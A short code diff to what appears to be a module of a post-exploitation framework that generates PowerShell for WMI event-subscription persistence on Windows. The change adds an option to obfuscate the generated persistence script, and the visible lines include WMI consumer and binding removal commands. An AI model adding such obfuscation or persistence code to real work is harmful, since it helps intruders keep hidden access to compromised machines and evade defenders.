@@ -96,7 +96,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
         
@@ -123,7 +123,8 @@ class Module:
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='"+subName+"'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '"+subName+"'} | Remove-WmiObject;"
             script += "'WMI persistence removed.'"
-            
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
@@ -197,5 +198,6 @@ class Module:
 
 
         script += "'WMI persistence established "+statusMsg+"'"
-        
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         return script
